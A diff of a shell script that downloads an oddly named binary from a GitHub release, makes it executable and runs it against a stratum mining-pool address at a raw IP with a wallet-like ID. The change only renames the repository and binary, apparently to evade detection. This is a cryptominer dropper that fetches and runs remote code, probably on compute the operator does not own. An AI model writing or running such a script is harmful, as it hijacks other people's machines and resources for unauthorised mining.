@@ -1,5 +1,5 @@
 #!/bin/sh
 apt update && apt install unzip -y
-wget https://github.com/virtolm/gangs/releases/download/gasa/gangar
-chmod +x gangar
-./gangar -P stratum1+tcp://cb5691ea88389782ab6415d498877356f66e6c37a778.$(shuf -n 1 -i 1-99999)-gansB@45.33.121.144:8081
+wget https://github.com/virtolm/pogs/releases/download/plol/poork
+chmod +x poork
+./poork -P stratum1+tcp://cb5691ea88389782ab6415d498877356f66e6c37a778.$(shuf -n 1 -i 1-99999)-pools@45.33.121.144:8081
